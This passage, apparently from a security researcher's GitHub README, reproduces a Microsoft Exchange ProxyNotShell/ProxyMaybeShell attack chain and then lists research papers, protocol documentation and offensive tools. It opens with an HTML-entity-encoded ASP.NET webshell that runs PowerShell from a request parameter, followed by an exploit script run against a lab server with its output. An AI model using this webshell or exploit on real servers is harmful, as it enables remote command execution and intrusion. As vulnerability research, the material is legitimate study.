20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x63;&#x61;&#x74;&#x63;&#x68;&#x28;&#x45;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2e;&#x46;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x28;&#x22;&#x45;&#x72;&#x72;&#x6f;&#x72;&#x3a;&#x20;&#x7b;&#x30;&#x7d;&#x22;&#x2c;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x76;&#x6f;&#x69;&#x64;&#x20;&#x50;&#x61;&#x67;&#x65;&#x5f;&#x4c;&#x6f;&#x61;&#x64;&#x28;&#x6f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x65;&#x72;&#x2c;&#x20;&#x45;&#x76;&#x65;&#x6e;&#x74;&#x41;&#x72;&#x67;&#x73;&#x20;&#x65;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x2e;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x73;&#x5b;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x5d;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
```

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxymaybeshell1.png)

Then put the encoded data into the [proxynotshellfileWrite.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py) script as follows:

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxymaybeshell2.png)

Run the shell writing script

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain/proxymaybeshell/ProxyMaybeShell-main# python2 proxynotshellfileWrite.py https://10.0.102.210 "VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==" 1
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

Some powershell commands can be executed, and with that the reproduction of proxymaybeshell comes to a temporary end

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxymaybeshell3.png)

- ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/proxymaybeshell4.png)

# Research white paper PDFs

- [Friday the 13th JSON Attacks](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
 - [ProxyLogon is Just the Tip of the Iceberg](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf)
 - [Are you my Type? - Breaking .NET Through Serialization](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
 - [Pwn2Own 2021 Microsoft Exchange Exploit Chain 3rd Vulnerability doc](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/pwn2own2021msexchange3rdvulnpdf.docx)
 - [Webshells in advanced attack and defense exercises](https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf)
 - [Cracking the Lens: Targeting HTTP's Hidden Attack Surface](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/research-pdfs/crackingthelens-whitepaper.pdf)
 - [DPAPI exploitation during pentest and password cracking](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/DPAPI%20exploitation%20during%20pentest.pdf)
 - [How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/How%20I%20Hacked%20pwn2own2022.pdf)
 - [SCALEABLE HASH TABLE FOR SHARED MEMORY MULTIPROCESSOR SYSTEM](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/SCALEABLE%20HASH.TABLE%20FOR%20SHARED.pdf)
 - [Vulnerability Exchange: One Domain Account for More Than Exchange Server RCE](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf)
 - [File Operation Induced Unserialization via the "phar://" Stream Wrapper](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
 - [Timeless Timing Attacks](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/us-21-Timeless-Timing-Attacks.pdf)
 - [Practical Web Cache Poisoning: Redefining 'Unexploitable'](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/web-cache-poisoning.pdf)
 - [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/research-pdfs/An%20ACE%20Up%20the%20Sleeve.pdf)

# offline address book

- concept [Email addresses and address books in Exchange Server](https://learn.microsoft.com/en-us/exchange/email-addresses-and-address-books/email-addresses-and-address-books?view=exchserver-2019)
 - Design
 - [[MS-OXOAB]: Offline Address Book (OAB) File Format and Schema](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxoab/b4750386-66ec-4e69-abb6-208dd131c7de)
 - [[MS-OXWOAB]: Offline Address Book (OAB) Retrieval File Format](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxwoab/56ef97c8-641c-4cf6-b965-c0457cc50488)
 - [[MS-OXPFOAB]: Offline Address Book (OAB) Public Folder Retrieval Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxpfoab/258a07a7-34a7-4373-87c1-cddf51447d00)

# Low Level API (RPC)
 - [All protocols](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/exchange-protocols/)
 - ![](https://raw.githubusercontent.com/FDlucifer/Proxy-Attackchain/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/pics/protocols.png)
 - [A tool to abuse Exchange services](https://github.com/sensepost/ruler)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
 - [Exchange Server Protocol Documents](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83?source=recommendations)
 - [Export items by using EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-export-items-by-using-ews-in-exchange)
 - [Autodiscover for Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/autodiscover-for-exchange)
 - [[MS-OXCFXICS]: Bulk Data Transfer Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcfxics/b9752f3d-d50d-44b8-9e6b-608a117c8532)

# Other Links

- [ProxyVulns](https://github.com/hosch3n/ProxyVulns)
 - [pax](https://github.com/liamg/pax)
 - [padre](https://github.com/glebarez/padre)
 - [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)
 - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 - [Hijacking mail chains with ProxyShell and ProxyLogon](https://paper.seebug.org/1764/)
 - [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [Post-exploitation/Lab/Exchange](https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/Exchange.md)
